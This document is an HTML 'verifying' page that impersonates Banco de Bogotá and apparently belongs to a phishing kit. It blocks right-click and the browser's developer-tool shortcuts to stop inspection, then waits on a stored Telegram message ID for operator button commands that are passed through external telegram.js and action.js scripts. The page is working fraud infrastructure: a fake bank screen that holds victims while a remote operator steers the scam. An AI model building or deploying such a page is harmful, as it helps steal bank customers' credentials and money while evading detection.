

<!DOCTYPE html>
<html lang="es">

<head>
    <script>

        
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123) return false;
            if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        }
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Bogotá - Validando</title>
    <style>
        body {
            background-color: #2c3e50;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            color: #fff;
            font-family: 'Open Sans', Arial, sans-serif;
        }

        .loader-container {
            position: relative;
            width: 60px;
            height: 60px;
            animation: rotateLoader 1.5s linear infinite;
        }

        .dot {
            position: absolute;
            width: 20px;
            height: 20px;
            border-radius: 50%;
        }

        .dot-yellow {
            background-color: #f1c40f;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
        }

        .dot-blue {
            background-color: #3498db;
            bottom: 5px;
            left: 0;
        }

        .dot-red {
            background-color: #e74c3c;
            bottom: 5px;
            right: 0;
        }

        @keyframes rotateLoader {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            color: white;
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>

<body>
    <div class="loader-container">
        <div class="dot dot-yellow"></div>
        <div class="dot dot-blue"></div>
        <div class="dot dot-red"></div>
    </div>
    <div class="loading-text">Verificando...</div>

    <script src="telegram.js"></script>
    <script src="action.js"></script>

    <script>
        // Detener escucha previa
        if (window.stopListening) {
            window.stopListening();
        }

        // Limpiar cualquier timeout previo
        const highestTimeoutId = setTimeout(() => {}, 0);
        for (let i = 0; i < highestTimeoutId; i++) {
            clearTimeout(i);
        }

        // Escuchar botones de Telegram
        document.addEventListener('DOMContentLoaded', function() {
            const existingMsgId = localStorage.getItem('bbogota_msg_id');

            console.log('🔍 Verificando message_id:', existingMsgId);

            if (!existingMsgId) {
                console.error('❌ No hay message_id guardado');
                document.querySelector('.loading-text').textContent = 'Error: No hay conexión con Telegram';
                return;
            }

            if (typeof listenCurrentButtons === 'function') {
                if (typeof actionProcessed !== 'undefined') {
                    actionProcessed = false;
                }

                console.log('👂 Iniciando escucha...');

                setTimeout(() => {
                    listenCurrentButtons(window.handleTelegramAction);
                }, 500);
            } else {
                console.error('❌ listenCurrentButtons no está disponible');
            }
        });
    </script>
</body>

</html>
